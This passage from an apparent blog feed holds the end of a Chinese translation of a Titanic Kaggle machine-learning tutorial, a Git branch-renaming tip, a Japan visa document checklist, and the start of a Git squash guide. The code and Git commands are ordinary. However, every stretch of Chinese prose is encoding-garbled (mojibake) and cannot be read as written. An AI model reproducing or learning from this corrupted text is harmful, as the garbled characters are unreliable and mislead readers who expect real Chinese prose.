test = combined.iloc[<span class="number">891</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> train, test, targets</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train, test, targets = recover_train_test_target()</span><br></pre></td></tr></table></figure><h3><span id="te-zheng-xuan-ze">ç‰¹å¾é€‰æ‹©</span></h3><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»æå‡ºäº†30å¤šä¸ªç‰¹å¾ã€‚è¿™ä¸ªæ•°å­—éå¸¸å¤§ã€‚</p><p>åœ¨å®Œæˆç‰¹å¾å·¥ç¨‹æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸å€¾å‘äºé€šè¿‡é€‰æ‹©æ•è·åŸºæœ¬ç‰¹å¾çš„â€œæ­£ç¡®â€æ•°é‡çš„ç‰¹å¾æ¥å‡å°‘ç»´åº¦ã€‚</p><p>äº‹å®ä¸Šï¼Œç‰¹å¾é€‰æ‹©å¸¦æ¥è®¸å¤šå¥½å¤„ï¼š</p><ul><li>å®ƒå‡å°‘äº†æ•°æ®ä¹‹é—´çš„å†—ä½™</li><li>å®ƒåŠ å¿«äº†è®­ç»ƒè¿‡ç¨‹</li><li>å®ƒå‡å°‘è¿‡æ‹Ÿåˆ</li></ul><p>åŸºäºæ ‘çš„ä¼°ç®—å™¨å¯ç”¨äºè®¡ç®—ç‰¹å¾é‡è¦æ€§ï¼Œè€Œè¿™äº›é‡è¦æ€§åˆå¯ç”¨äºä¸¢å¼ƒä¸ç›¸å…³çš„ç‰¹å¾ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">clf = RandomForestClassifier(n_estimators=<span class="number">50</span>, max_features=<span class="string">&#x27;sqrt&#x27;</span>)</span><br><span class="line">clf = clf.fit(train, targets)</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹çœ‹æ¯ä¸ªç‰¹å¾çš„é‡è¦æ€§ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">features = pd.DataFrame()</span><br><span class="line">features[<span class="string">&#x27;feature&#x27;</span>] = train.columns</span><br><span class="line">features[<span class="string">&#x27;importance&#x27;</span>] = clf.feature_importances_</span><br><span class="line">features.sort_values(by=[<span class="string">&#x27;importance&#x27;</span>], ascending=<span class="literal">True</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">features.set_index(<span class="string">&#x27;feature&#x27;</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">features.plot(kind=<span class="string">&#x27;barh&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">25</span>))</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.axes._subplots.AxesSubplot at 0x117ff2a10&gt;</code></pre><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/8.png" alt="png"></p><p>æ­£å¦‚æ‚¨å¯èƒ½æ³¨æ„åˆ°çš„é‚£æ ·ï¼Œä¸ <code>Title_Mr</code>ï¼Œ<code>Age</code>ï¼Œ<code>Fare</code> å’Œ <code>Sex</code> ç›¸å…³è”éå¸¸é‡è¦ã€‚</p><p>ä¸ <code>Passenger_Id</code> ä¹Ÿæœ‰é‡è¦çš„ç›¸å…³æ€§ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬å°†æˆ‘ä»¬çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†è½¬æ¢ä¸ºæ›´ç´§å‡‘çš„æ•°æ®é›†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = SelectFromModel(clf, prefit=<span class="literal">True</span>)</span><br><span class="line">train_reduced = model.transform(train)</span><br><span class="line"><span class="built_in">print</span> train_reduced.shape</span><br></pre></td></tr></table></figure><pre><code>(891, 12)</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_reduced = model.transform(test)</span><br><span class="line"><span class="built_in">print</span> test_reduced.shape</span><br></pre></td></tr></table></figure><pre><code>(418, 12)</code></pre><p>å¥½æäº†ï¼ ç°åœ¨æˆ‘ä»¬çš„ç‰¹å¾å‡å°‘äº†å¾ˆå¤šã€‚</p><p>æˆ‘ä»¬å°†çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦ä¼šä½¿ç”¨è®­ç»ƒé›†çš„å‡å°‘ç‰ˆæˆ–å®Œæ•´ç‰ˆã€‚</p><h3><span id="rang-wo-men-chang-shi-bu-tong-de-ji-chu-mo-xing">è®©æˆ‘ä»¬å°è¯•ä¸åŒçš„åŸºç¡€æ¨¡å‹</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logreg = LogisticRegression()</span><br><span class="line">logreg_cv = LogisticRegressionCV()</span><br><span class="line">rf = RandomForestClassifier()</span><br><span class="line">gboost = GradientBoostingClassifier()</span><br><span class="line"></span><br><span class="line">models = [logreg, logreg_cv, rf, gboost]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Cross-validation of : &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(model.__class__)</span><br><span class="line">    score = compute_score(clf=model, X=train_reduced, y=targets, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;CV score = &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(score)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;****&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>Cross-validation of : &lt;class 'sklearn.linear_model.logistic.LogisticRegression'&gt;CV score = 0.818195097715****Cross-validation of : &lt;class 'sklearn.linear_model.logistic.LogisticRegressionCV'&gt;CV score = 0.81818240172****Cross-validation of : &lt;class 'sklearn.ensemble.forest.RandomForestClassifier'&gt;CV score = 0.808183171282****Cross-validation of : &lt;class 'sklearn.ensemble.gradient_boosting.GradientBoostingClassifier'&gt;CV score = 0.824917697684****</code></pre><h3><span id="chao-can-shu-diao-zheng">è¶…å‚æ•°è°ƒæ•´</span></h3><p>æ­£å¦‚å»ºæ¨¡éƒ¨åˆ†çš„å¼€å¤´æ‰€æåˆ°çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨éšæœºæ£®æ—æ¨¡å‹ã€‚å®ƒå¯èƒ½ä¸æ˜¯è¿™é¡¹ä»»åŠ¡çš„æœ€ä½³æ¨¡å‹ï¼Œä½†æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•è°ƒæ•´ã€‚è¿™é¡¹å·¥ä½œå¯ä»¥åº”ç”¨äºä¸åŒçš„æ¨¡å‹ã€‚</p><p>éšæœºæ£®æ—éå¸¸æ–¹ä¾¿ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä¼šå¸¦æœ‰ä¸€äº›å‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œä»¥ä¾¿ä¸ºé¢„æµ‹ä»»åŠ¡è·å¾—æœ€ä½³æ¨¡å‹ã€‚</p><p>è¦äº†è§£æœ‰å…³éšæœºæ£®æ—çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤ <a href="https://www.analyticsvidhya.com/blog/2015/06/tuning-random-forest-model/">é“¾æ¥</a>ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å…¨éƒ¨è®­ç»ƒé›†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># turn run_gs to True if you want to run the gridsearch again.</span></span><br><span class="line">run_gs = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> run_gs:</span><br><span class="line">    parameter_grid = &#123;</span><br><span class="line">                 <span class="string">&#x27;max_depth&#x27;</span> : [<span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>],</span><br><span class="line">                 <span class="string">&#x27;n_estimators&#x27;</span>: [<span class="number">50</span>, <span class="number">10</span>],</span><br><span class="line">                 <span class="string">&#x27;max_features&#x27;</span>: [<span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;auto&#x27;</span>, <span class="string">&#x27;log2&#x27;</span>],</span><br><span class="line">                 <span class="string">&#x27;min_samples_split&#x27;</span>: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>],</span><br><span class="line">                 <span class="string">&#x27;min_samples_leaf&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>],</span><br><span class="line">                 <span class="string">&#x27;bootstrap&#x27;</span>: [<span class="literal">True</span>, <span class="literal">False</span>],</span><br><span class="line">                 &#125;</span><br><span class="line">    forest = RandomForestClassifier()</span><br><span class="line">    cross_validation = StratifiedKFold(n_splits=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    grid_search = GridSearchCV(forest,</span><br><span class="line">                               scoring=<span class="string">&#x27;accuracy&#x27;</span>,</span><br><span class="line">                               param_grid=parameter_grid,</span><br><span class="line">                               cv=cross_validation,</span><br><span class="line">                               verbose=<span class="number">1</span></span><br><span class="line">                              )</span><br><span class="line"></span><br><span class="line">    grid_search.fit(train, targets)</span><br><span class="line">    model = grid_search</span><br><span class="line">    parameters = grid_search.best_params_</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Best score: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grid_search.best_score_))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Best parameters: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grid_search.best_params_))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    parameters = &#123;<span class="string">&#x27;bootstrap&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;min_samples_leaf&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;n_estimators&#x27;</span>: <span class="number">50</span>,</span><br><span class="line">                  <span class="string">&#x27;min_samples_split&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;max_features&#x27;</span>: <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;max_depth&#x27;</span>: <span class="number">6</span>&#125;</span><br><span class="line"></span><br><span class="line">    model = RandomForestClassifier(**parameters)</span><br><span class="line">    model.fit(train, targets)</span><br></pre></td></tr></table></figure><p>ç°åœ¨é€šè¿‡æ‰«æè¶…å‚æ•°çš„å‡ ä¸ªç»„åˆæ¥æ„å»ºæ¨¡å‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªè¾“å‡ºæ–‡ä»¶ä»¥åœ¨ Kaggle ä¸Šæäº¤ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = model.predict(test).astype(<span class="built_in">int</span>)</span><br><span class="line">df_output = pd.DataFrame()</span><br><span class="line">aux = pd.read_csv(<span class="string">&#x27;./data/test.csv&#x27;</span>)</span><br><span class="line">df_output[<span class="string">&#x27;PassengerId&#x27;</span>] = aux[<span class="string">&#x27;PassengerId&#x27;</span>]</span><br><span class="line">df_output[<span class="string">&#x27;Survived&#x27;</span>] = output</span><br><span class="line">df_output[[<span class="string">&#x27;PassengerId&#x27;</span>,<span class="string">&#x27;Survived&#x27;</span>]].to_csv(<span class="string">&#x27;./predictions/gridsearch_rf.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3><span id="bonus-hun-he-bu-tong-mo-xing">[BONUS] æ··åˆä¸åŒæ¨¡å‹</span></h3><p>æˆ‘æ²¡æœ‰äº²è‡ªä¸Šä¼ åŸºäºæ¨¡å‹æ··åˆçš„æäº¤ï¼Œä½†è¿™æ˜¯ä½ å¯ä»¥è¿™ä¹ˆåšï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trained_models = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    model.fit(train, targets)</span><br><span class="line">    trained_models.append(model)</span><br><span class="line"></span><br><span class="line">predictions = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> trained_models:</span><br><span class="line">    predictions.append(model.predict_proba(test)[:, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">predictions_df = pd.DataFrame(predictions).T</span><br><span class="line">predictions_df[<span class="string">&#x27;out&#x27;</span>] = predictions_df.mean(axis=<span class="number">1</span>)</span><br><span class="line">predictions_df[<span class="string">&#x27;PassengerId&#x27;</span>] = aux[<span class="string">&#x27;PassengerId&#x27;</span>]</span><br><span class="line">predictions_df[<span class="string">&#x27;out&#x27;</span>] = predictions_df[<span class="string">&#x27;out&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> s &gt;= <span class="number">0.5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">predictions_df = predictions_df[[<span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;out&#x27;</span>]]</span><br><span class="line">predictions_df.columns = [<span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;Survived&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">predictions_df.to_csv(<span class="string">&#x27;./predictions/blending_base_models.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è·å¾—è‰¯å¥½çš„æ··åˆæäº¤ï¼ŒåŸºæœ¬æ¨¡å‹åº”è¯¥æ˜¯ä¸åŒçš„ï¼Œå¹¶ä¸”å®ƒä»¬çš„ç›¸å…³æ€§æ˜¯ä¸ç›¸å…³çš„ã€‚</p><h2><span id="iv-jie-lun">IV - ç»“è®º</span></h2><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æ¢è®¨äº† <a href="http://kaggle.com">Kaggle</a> å¸¦ç»™æˆ‘ä»¬çš„ä¸€ä¸ªæœ‰è¶£çš„æ•°æ®é›†ã€‚</p><p>æˆ‘ä»¬æµè§ˆäº†æ•°æ®ç§‘å­¦ç®¡é“çš„åŸºæœ¬è¦ç‚¹ï¼š</p><ul><li>æ•°æ®æ¢ç´¢å’Œå¯è§†åŒ–ï¼šåˆ¶å®šå‡è®¾çš„ç¬¬ä¸€æ­¥</li><li>æ•°æ®æ¸…ç†</li><li>ç‰¹å¾å·¥ç¨‹</li><li>ç‰¹å¾é€‰æ‹©</li><li>è¶…å‚æ•°è°ƒæ•´</li><li>æäº¤</li><li>æ··åˆ</li></ul><p>å¦‚æœæ‚¨æƒ³æµ‹è¯•å’Œä½¿ç”¨å®ƒï¼Œå¯ä»¥å°†æ­¤åšå®¢ä¸‹è½½ä¸ºç¬”è®°æœ¬ï¼š<a href="https://github.com/ahmedbesbes/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/raw/master/article_1.ipynb">æˆ‘çš„ github repo</a></p><blockquote><p>è¯‘è€…æ³¨ï¼šæ­¤ä¸­æ–‡ç¿»è¯‘åœ°å€ä¸ºï¼š <a href="https://github.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/raw/master/article_cn.ipynb">qiwihui çš„ github repo</a></p></blockquote><p>å…³äºè¿™ä¸€æŒ‘æˆ˜çš„æ–‡ç« å¾ˆå¤šï¼Œæ‰€ä»¥æ˜¾ç„¶è¿˜æœ‰æ”¹è¿›çš„ä½™åœ°ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘å»ºè®®çš„åç»­æ­¥éª¤ï¼š</p><ul><li>æŒ–æ˜æ›´å¤šæ•°æ®å¹¶æœ€ç»ˆæ„å»ºæ–°ç‰¹å¾ã€‚</li><li>å°è¯•ä¸åŒçš„æ¨¡å‹ï¼šé€»è¾‘å›å½’ï¼ŒGradient Boosted Treeï¼ŒXGboost ç­‰ã€‚</li><li>å°è¯•é›†æˆå­¦ä¹ æŠ€å·§ï¼ˆå †å ï¼‰</li><li>è¿è¡Œ auto-ML æ¡†æ¶</li></ul><p>å¦‚æœä½ èƒ½æ‰¾åˆ°æ”¹å–„æˆ‘çš„è§£å†³æ–¹æ¡ˆçš„æ–¹æ³•ï¼Œæˆ‘ä¼šéå¸¸é«˜å…´ã€‚è¿™å¯ä»¥è®©æˆ‘æ›´æ–°æ–‡ç« ï¼Œç»å¯¹ç»™ä½ ä¿¡ä»»ã€‚æ‰€ä»¥è¯·éšæ—¶å‘è¡¨è¯„è®ºã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¦‚ä½•åœ¨ Titanic Kaggle Challenge ä¸­è·å¾—0.8134åˆ†
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>é‡å‘½åæœ¬åœ°å’Œè¿œç¨‹ Git åˆ†æ”¯åç§°</title>
    <link href="https://qiwihui.com/qiwihui-blog-54/"/>
    <id>https://qiwihui.com/qiwihui-blog-54/</id>
    <published>2019-12-02T06:12:50.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä¸å°å¿ƒå†™é”™äº†åˆ†æ”¯åç§°åˆå°†åˆ†æ”¯æ¨é€åˆ°äº†è¿œç«¯ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤è¿›è¡Œä¿®æ­£ï¼š</p><span id="more"></span><ol><li><p>é‡å‘½åæœ¬åœ°åˆ†æ”¯ï¼š</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -m old-name new-name</span><br></pre></td></tr></table></figure><p>è‹¥å½“å‰åœ¨ <code>old-name</code> åˆ†æ”¯ä¸Šï¼Œåˆ™å¯ä»¥çœç•¥ <code>old-name</code>ï¼š</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -m new-name</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤è¿œç¨‹è€åˆ†æ”¯ï¼š</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin :old-name</span><br></pre></td></tr></table></figure></li><li><p>æ¨é€æ–°çš„æœ¬åœ°åˆ†æ”¯ï¼Œå¹¶è®¾ç½®æœ¬åœ°æ–°åˆ†æ”¯è¿½è¸ªè¿œç¨‹åˆ†æ”¯ï¼š</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin -u new-name</span><br></pre></td></tr></table></figure></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      é‡å‘½åæœ¬åœ°å’Œè¿œç¨‹ Git åˆ†æ”¯åç§°
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>èµ´æ—¥å•æ¬¡æ—…è¡Œç­¾è¯ç”³è¯·è®°å½•</title>
    <link href="https://qiwihui.com/qiwihui-blog-59/"/>
    <id>https://qiwihui.com/qiwihui-blog-59/</id>
    <published>2019-10-03T15:43:06.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡èµ´æ—¥æ—…è¡Œï¼Œè®¡åˆ’å¤§é˜ªå¥ˆè‰¯å’Œä¸œäº¬ï¼Œç®€å•è®°å½•è¡Œå‰å‡†å¤‡ã€‚</p><span id="more"></span><h2><span id="qian-zheng-suo-xu-cai-liao">ç­¾è¯æ‰€éœ€ææ–™</span></h2><p>ä»¥ä¸‹ææ–™ä¸ºæœ¬æ¬¡ç”³è¯·ç­¾è¯æ‰€éœ€ææ–™ï¼š</p><p>ä¸»ç”³äººï¼š</p><ol><li>æœ¬äººæŠ¤ç…§ï¼ŒåŸä»¶ï¼ˆæœ‰æ•ˆæœŸè‡³å°‘åœ¨6ä¸ªæœˆä»¥ä¸Šï¼‰ï¼›</li><li>ç­¾è¯ç”³è¯·è¡¨ï¼š1ä»½ï¼›</li><li>ä¸ªäººä¿¡æ¯å¤„ç†åŒæ„ä¹¦ï¼š1ä»½ï¼›</li><li>æœ¬äººç…§ç‰‡ï¼š2å¼ ï¼Œ4.5*4.5cmç™½åº•å½©è‰²è¿‘ç…§ï¼ˆç°ç…§ï¼Œç›¸ç‰‡å¯æ·¡å¦†ï¼‰ï¼›</li><li>æœ¬äººèº«ä»½è¯æ­£åå¤å°ä»¶ï¼š1ä»½ï¼›</li><li>æˆ·å£æœ¬å¤å°ä»¶ï¼š1ä»½ï¼Œæˆ·å£æœ¬é¦–é¡µå’Œæœ¬äººé¡µï¼›</li><li>æœ¬äººåœ¨èŒè¯æ˜ï¼š1ä»½ï¼Œç›–å…¬å¸çš„å…¬ç« ï¼›</li><li>ä¼ä¸šè¥ä¸šæ‰§ç…§å‰¯æœ¬å¤å°ä»¶ï¼š1ä»½ï¼›</li><li>ç»æµè¯æ˜ææ–™ï¼šä¸€å¹´çš„å·¥èµ„æµæ°´è´¦å•ï¼Œæ¯ä¸ªæœˆå­˜æŠ˜ä¸Šçš„å¤§äº8000ï¼Œä¸”è¿‘ä¸€å¹´é“¶è¡Œæµæ°´10ä¸‡å…ƒä»¥ä¸Šï¼›</li><li>ç»“å©šè¯å¤å°ä»¶ï¼š1ä»½ã€‚</li></ol><p>éšè¡Œï¼š</p><ol><li>æœ¬äººæŠ¤ç…§ï¼ŒåŸä»¶ï¼ˆæœ‰æ•ˆæœŸè‡³å°‘åœ¨6ä¸ªæœˆä»¥ä¸Šï¼‰ï¼›</li><li>ç­¾è¯ç”³è¯·è¡¨ï¼š1ä»½ï¼›</li><li>ä¸ªäººä¿¡æ¯å¤„ç†åŒæ„ä¹¦ï¼š1ä»½ï¼›</li><li>æœ¬äººç…§ç‰‡ï¼š2å¼ ï¼Œ4.5*4.5cmç™½åº•å½©è‰²è¿‘ç…§ï¼ˆç°ç…§ï¼Œç›¸ç‰‡å¯æ·¡å¦†ï¼‰ï¼›</li><li>æœ¬äººèº«ä»½è¯æ­£åå¤å°ä»¶ï¼š1ä»½ï¼›</li><li>æˆ·å£æœ¬å¤å°ä»¶ï¼š1ä»½ï¼Œæˆ·å£æœ¬é¦–é¡µå’Œæœ¬äººé¡µï¼›</li><li>ç»“å©šè¯å¤å°ä»¶ï¼š1ä»½ã€‚</li></ol><p>å› ä¸ºé€‰æ‹©çš„ä»£åŠæ—…è¡Œç¤¾æ²¡æœ‰è¦æ±‚èµ´æ—¥è¡Œç¨‹å’Œæœºç¥¨é…’åº—é¢„è®¢è®°å½•ï¼Œæ‰€ä»¥æ²¡æœ‰æä¾›ã€‚</p><h2><span id="ti-qian-gou-mai-huo-yu-ding-de-wu-pin">æå‰è´­ä¹°æˆ–é¢„è®¢çš„ç‰©å“</span></h2><ol><li>æœºç¥¨ï¼Œé…’åº—é¢„è®¢ï¼›</li><li>é€šä¿¡ï¼šæ—¥æœ¬æµé‡å¡ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨éšèº«wifiæˆ–è€…åŠç†ç”µè¯å¡å›½é™…å¥—é¤ï¼‰ï¼›</li><li>é¢„è®¢å’Œæœä½“éªŒï¼›</li><li>é¢„è®¢ä¸œäº¬è¿ªæ–¯å°¼æµ·æ´‹é¦†é—¨ç¥¨ï¼›</li><li>è½¦ç¥¨åŸºæœ¬éƒ½åœ¨å½“åœ°è´­ä¹°äº†ï¼Œæ²¡æœ‰æå‰é¢„è®¢ã€‚</li></ol><p>æœ€åï¼Œæœ€æœ€é‡è¦çš„ï¼Œå°±æ˜¯å¼€å¿ƒå°±å¥½ï¼Œä¸ç”¨å¤ªæ‹˜æ³¥äºæ™¯ç‚¹æœ‰æ²¡æœ‰éƒ½æ¸¸è§ˆä¸€éã€‚</p><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/59#issuecomment-472294058"><strong>qiwihui</strong></a> on: <strong>3/13/2019</strong></p></blockquote><h2><span id="qian-zheng-shen-qing"><img src="https://github.trello.services/images/mini-trello-icon.png" alt> </span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/59#issuecomment-482011539"><strong>qiwihui</strong></a> on: <strong>4/11/2019</strong></p></blockquote><p><img src="https://github.trello.services/images/mini-trello-icon.png" alt> <a href="https://trello.com/c/rJvp34cd/134-%E6%97%A5%E6%9C%AC%E6%A8%B1%E8%8A%B1%E4%B9%8B%E8%A1%8C">æ—¥æœ¬æ¨±èŠ±ä¹‹è¡Œ</a></p>]]></content>
    
    <summary type="html">
    
      èµ´æ—¥å•æ¬¡æ—…è¡Œç­¾è¯ç”³è¯·è®°å½•
    
    </summary>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Gitåˆå¹¶æäº¤</title>
    <link href="https://qiwihui.com/qiwihui-blog-70/"/>
    <id>https://qiwihui.com/qiwihui-blog-70/</id>
    <published>2019-09-05T06:40:55.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘ä»¬çš„Gitæäº¤åŸåˆ™ç»å¸¸æ˜¯å°åŠŸèƒ½å¤šæ¬¡æäº¤ï¼Œä½†æ˜¯æœ‰æ—¶éœ€è¦åœ¨å®ŒæˆåŠŸèƒ½ä¹‹åå°†å¤šä¸ªè¿ç»­çš„æäº¤åˆå¹¶æˆä¸€ä¸ªï¼Œæˆ–è€…è¿›è¡Œåˆ†æ”¯åˆå¹¶æ—¶ï¼Œåªä¿ç•™ä¸€ä¸ªæäº¤ï¼Œä»¥ä¿è¯åˆ†æ”¯ç®€ä»‹ï¼Œè¿™æ—¶å°±éœ€è¦è¿›è¡Œsquashæ“ä½œï¼Œä¸¤ç§åˆ†åˆ«ç§°ä¸º Rebase Squash å’Œ Merge Squashã€‚è¿™ç¯‡tipä¸»è¦è®°å½•å¦‚ä½•å¤„ç†è¿™ä¸¤ç§æ“ä½œä»¥åŠä¹‹é—´çš„åŒºåˆ«ï¼Œ</p><span id="more"></span><h2><span id="rebase-squash">Rebase Squash</span></h2><p>ç”¨æ¥å°†å¤šä¸ªè¿ç»­çš„æäº¤åˆå¹¶ä¸ºä¸€ä¸ªï¼Œä»¥ä¸‹é¢çš„æäº¤è®°å½•ä¸ºä¾‹ï¼Œ<code>master</code>æ˜¯ä¸»åˆ†æ”¯ï¼Œåˆ†æ”¯ <code>featureY</code> æäº¤äº†ä¸€ç³»åˆ—çš„ä¿®æ”¹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>lg</code> æ˜¯å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[alias]</span><br><span class="line">        lg = log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit --</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆå¹¶ <code>featureY</code> åŠŸèƒ½åˆ†æ”¯ä¸Šçš„ <code>Y1</code> åˆ° <code>Y5</code> è¿™äº”ä¸ªæäº¤ä¸ºä¸€ä¸ªã€‚gitæä¾›äº†å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rebase --interactive HEAD~[N]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æˆ–è€…</span></span><br><span class="line">git rebase -i HEAD~[N]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>[N]</code> è¡¨ç¤ºéœ€è¦åˆå¹¶çš„æ•°é‡ï¼Œä»æœ€è¿‘ä¸€ä¸ªæäº¤å¼€å§‹æ•°ï¼Œè¿™é‡Œä¸º<code>5</code>ã€‚åœ¨å‘½ä»¤è¡Œè¾“å…¥ <code>git rebase --interactive HEAD~5</code> è¿›å…¥ç¼–è¾‘å™¨è¿›è¡Œé€‰æ‹©ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„æäº¤é¡ºåºæ˜¯ <strong>å</strong> 